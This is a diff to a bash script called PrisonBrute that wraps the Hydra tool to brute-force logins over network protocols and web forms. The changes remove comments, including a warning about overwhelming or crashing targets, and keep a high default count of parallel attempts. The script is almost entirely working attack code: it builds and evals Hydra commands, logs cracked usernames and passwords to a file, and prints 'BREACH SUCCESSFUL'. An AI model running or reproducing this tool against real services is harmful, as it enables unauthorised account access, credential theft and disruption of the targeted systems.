@@ -1,12 +1,7 @@
 #!/bin/bash
-
-# --- Configuration ---
-# WARNING: High task counts can overwhelm targets, get you blocked, or crash services.
-# Adjust PRISON_DEFAULT_TASKS based on your network, target, and ethical considerations.
 PRISON_DEFAULT_TASKS=64 # Increased default tasks for "faster" attempts
 OUTPUT_FILE="pb_found_credentials.txt"
 
-# --- Colors ---
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[0;33m'
@@ -15,9 +10,7 @@ MAGENTA='\033[0;35m'
 CYAN='\033[0;36m'
 WHITE='\033[0;37m'
 BOLD='\033[1m'
-NC='\033[0m' # No Color
-
-# --- Helper Functions ---
+NC='\033[0m'
 print_banner() {
   echo -e "${RED}${BOLD}"
   echo "██████╗ ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗"
@@ -30,7 +23,6 @@ print_banner() {
   echo "        ${CYAN}High-Speed Hydra Attack Orchestrator${NC}"
   echo -e "${NC}"
 }
-
 print_help() {
   print_banner
   echo -e "${YELLOW}Usage: ./PrisonBrute.sh <protocol> <target> <user_source> <pass_source> [port] [options]${NC}"
@@ -72,7 +64,6 @@ print_help() {
   echo -e "${GREEN}Found credentials logged to: ${BOLD}${OUTPUT_FILE}${NC}"
   echo -e "${RED}${BOLD}USE RESPONSIBLY. UNAUTHORIZED ACCESS IS ILLEGAL.${NC}"
 }
-
 check_tool() {
   if ! command -v "$1" &> /dev/null; then
     echo -e "${RED}Error: Essential tool '${BOLD}$1${NC}${RED}' is not installed.${NC}"
@@ -80,10 +71,7 @@ check_tool() {
     exit 1
   fi
 }
-
-# --- Main Logic ---
 check_tool "hydra"
-
 if [ "$#" -lt 4 ]; then
   print_help
   exit 1
@@ -100,9 +88,8 @@ EXTRA_HYDRA_ARGS=()
 HTTP_FORM_PATH=""
 HTTP_FORM_PARAMS=""
 HTTP_FORM_FAILURE_MSG=""
-COMBO_FILE="" # For -C option
+COMBO_FILE=""
 
-# Parse remaining optional arguments
 while (( "$#" )); do
   case "$1" in
     -t)
@@ -114,7 +101,7 @@ while (( "$#" )); do
       fi
       ;;
     -w)
-      if [ -n "$2" ] && [[ "$2" =~ ^[0-9\.]+$ ]]; then # Allow decimals for wait
+      if [ -n "$2" ] && [[ "$2" =~ ^[0-9\.]+$ ]]; then
         EXTRA_HYDRA_ARGS+=("-w" "$2")
         shift 2
       else
@@ -130,17 +117,17 @@ while (( "$#" )); do
       fi
       ;;
     -f) EXTRA_HYDRA_ARGS+=("-f"); shift ;;
-    -v) EXTRA_HYDRA_ARGS+=("-v"); shift ;; # Verbose
-    -V) EXTRA_HYDRA_ARGS+=("-V"); shift ;; # Very Verbose (shows attempts)
+    -v) EXTRA_HYDRA_ARGS+=("-v"); shift ;; 
+    -V) EXTRA_HYDRA_ARGS+=("-V"); shift ;;
     -e)
       if [ -n "$2" ]; then
-        EXTRA_HYDRA_ARGS+=("-e" "$2") # e.g., -e ns for null pass, pass=user
+        EXTRA_HYDRA_ARGS+=("-e" "$2")
         shift 2
       else
         echo -e "${RED}Error: -e option requires an argument (e.g., ns).${NC}" >&2; exit 1
       fi
       ;;
-    -C) # Colon separated user:pass file
+    -C)
       if [ -n "$2" ] && [ -f "$2" ]; then
         COMBO_FILE="$2"
         EXTRA_HYDRA_ARGS+=("-C" "$2")
@@ -149,7 +136,7 @@ while (( "$#" )); do
         echo -e "${RED}Error: -C option requires a valid file path.${NC}" >&2; exit 1
       fi
       ;;
-    *) # Potentially port, or http-form specific args
+    *)
       if [[ "$PROTOCOL" == "http-form" || "$PROTOCOL" == "https-form" ]]; then
         if [[ "$1" == /* ]] && [ -z "$HTTP_FORM_PATH" ]; then HTTP_FORM_PATH="$1"
         elif [ -z "$HTTP_FORM_PARAMS" ] && [[ "$1" == *"^USER^"* ]] && [[ "$1" == *"^PASS^"* ]]; then HTTP_FORM_PARAMS="$1"
@@ -167,10 +154,8 @@ while (( "$#" )); do
   esac
 done
 
-# User/Pass/Combo options for Hydra
 USER_PASS_OPTS=""
 if [ -n "$COMBO_FILE" ]; then
-  # -C option handles both, so USER_SOURCE and PASS_SOURCE are ignored if -C is used
   USER_SOURCE="N/A (Using -C)"
   PASS_SOURCE="N/A (Using -C)"
 else
@@ -181,36 +166,26 @@ else
   else USER_PASS_OPTS+="-p \"$PASS_SOURCE\" "; fi
 fi
 
-
-# Port option for Hydra
 PORT_OPT=""
 if [ -n "$PORT_SPECIFIED" ]; then
   PORT_OPT="-s $PORT_SPECIFIED"
 fi
 
-# Default tasks if not overridden by user
 if ! [[ " ${EXTRA_HYDRA_ARGS[*]} " =~ " -t " ]]; then
   EXTRA_HYDRA_ARGS+=("-t" "$PRISON_DEFAULT_TASKS")
 fi
-
-# Always add output file, ensure it's quoted for spaces in path if any
-# Default to -V for some feedback unless -v is already specified.
-# If neither -v nor -V is given, add -V. If -v is given, that's fine. If -V is given, that's also fine.
 if ! [[ " ${EXTRA_HYDRA_ARGS[*]} " =~ " -v " ]] && ! [[ " ${EXTRA_HYDRA_ARGS[*]} " =~ " -V " ]]; then
     EXTRA_HYDRA_ARGS+=("-V")
 fi
 
 HYDRA_CMD_BASE="hydra ${USER_PASS_OPTS} ${PORT_OPT}"
-# Note: OUTPUT_FILE quoting is handled by eval later
 HYDRA_CMD_SUFFIX="${EXTRA_HYDRA_ARGS[*]} -o \"${OUTPUT_FILE}\""
-
-# Protocol-specific handling
-TARGET_SPECIFIER="$TARGET" # Usually the target IP/hostname
-SERVICE_NAME="$PROTOCOL"   # Usually the protocol string
+TARGET_SPECIFIER="$TARGET" 
+SERVICE_NAME="$PROTOCOL" 
 
 case "$PROTOCOL" in
   "http-get"|"https-get")
-    SERVICE_NAME="${PROTOCOL}:/" # Assumes root path, user can specify e.g. http-get:/admin/
+    SERVICE_NAME="${PROTOCOL}:/"
     ;;
   "http-form"|"https-form")
     if [ -z "$HTTP_FORM_PATH" ] || [ -z "$HTTP_FORM_PARAMS" ] || [ -z "$HTTP_FORM_FAILURE_MSG" ]; then
@@ -220,8 +195,6 @@ case "$PROTOCOL" in
     fi
     SERVICE_NAME="${PROTOCOL}:${HTTP_FORM_PATH}:${HTTP_FORM_PARAMS}:${HTTP_FORM_FAILURE_MSG}"
     ;;
-  # Add other protocol-specific adjustments if Hydra requires them
-  # e.g. some protocols might take target as "target/options"
 esac
 
 FULL_HYDRA_CMD="$HYDRA_CMD_BASE \"$TARGET_SPECIFIER\" $SERVICE_NAME $HYDRA_CMD_SUFFIX"
@@ -241,39 +214,30 @@ else
 fi
 echo -e "${CYAN}Output File.....: ${BOLD}${OUTPUT_FILE}${NC}"
 if [ ${#EXTRA_HYDRA_ARGS[@]} -gt 0 ]; then
-    # Reconstruct a readable version of EXTRA_HYDRA_ARGS for display
     DISPLAY_ARGS=""
-    TEMP_ARGS=("${EXTRA_HYDRA_ARGS[@]}") # Create a copy to manipulate
+    TEMP_ARGS=("${EXTRA_HYDRA_ARGS[@]}")
     while [ ${#TEMP_ARGS[@]} -gt 0 ]; do
         ARG_NAME="${TEMP_ARGS[0]}"
         DISPLAY_ARGS+="${ARG_NAME}"
-        unset TEMP_ARGS[0] # Remove the argument name
-        # If the argument typically has a value and one exists
+        unset TEMP_ARGS[0]
         if [[ "$ARG_NAME" == "-t" || "$ARG_NAME" == "-w" || "$ARG_NAME" == "-e" || "$ARG_NAME" == "-x" || "$ARG_NAME" == "-C" ]] && [ ${#TEMP_ARGS[@]} -gt 0 ]; then
             DISPLAY_ARGS+=" \"${TEMP_ARGS[0]}\""
-            unset TEMP_ARGS[0] # Remove the argument value
+            unset TEMP_ARGS[0]
         fi
         DISPLAY_ARGS+=" "
-        TEMP_ARGS=("${TEMP_ARGS[@]}") # Re-index array
+        TEMP_ARGS=("${TEMP_ARGS[@]}")
     done
     echo -e "${CYAN}Hydra Options...: ${BOLD}${DISPLAY_ARGS}${NC}"
 fi
 echo -e "${RED}-----------------------------------------------------${NC}"
 echo -e "${YELLOW}Executing Hydra: ${BOLD}${FULL_HYDRA_CMD}${NC}"
 echo -e "${BLUE}--- Hydra Output (Press Ctrl+C to abort) ---${NC}"
-
-# eval is used to correctly interpret quotes within $FULL_HYDRA_CMD,
-# especially for form parameters and file paths.
 eval "$FULL_HYDRA_CMD"
 HYDRA_EXIT_CODE=$?
 
 echo -e "${BLUE}--- Hydra Output End ---${NC}"
 echo -e "${RED}-----------------------------------------------------${NC}"
-
 if [ $HYDRA_EXIT_CODE -eq 0 ]; then
-  # Hydra exits 0 even if nothing is found, so we check the output file.
-  # Grep for lines that Hydra typically outputs for found credentials.
-  # Format: [service] host: TARGET login: USERNAME password: PASSWORD
   if grep -qE "\[.+\] host: .+ login: .+ password: .+" "${OUTPUT_FILE}"; then
     echo -e "\n${GREEN}${BOLD}>>> BREACH SUCCESSFUL! <<<${NC}"
     echo -e "${GREEN}Credentials found and logged to '${BOLD}${OUTPUT_FILE}${NC}'${NC}"
@@ -281,7 +245,7 @@ if [ $HYDRA_EXIT_CODE -eq 0 ]; then
     grep -E "\[.+\] host: .+ login: .+ password: .+" "${OUTPUT_FILE}" | \
     sed -e "s/^\[service\] //" -e "s/host: //" -e "s/ login: /${GREEN}User:${NC} /" -e "s/ password: / ${GREEN}Pass:${NC} /" | \
     awk '{print "  🎯 " $1 "  👤 " $2 " " $3 "  🔑 " $4 " " $5}'
-  elif grep -q "host:" "${OUTPUT_FILE}"; then # Fallback for slightly different formats
+  elif grep -q "host:" "${OUTPUT_FILE}"; then
     echo -e "\n${GREEN}${BOLD}>>> BREACH LIKELY! <<<${NC}"
     echo -e "${GREEN}Potential credentials found in '${BOLD}${OUTPUT_FILE}${NC}' (review manually).${NC}"
     grep "host:" "${OUTPUT_FILE}"
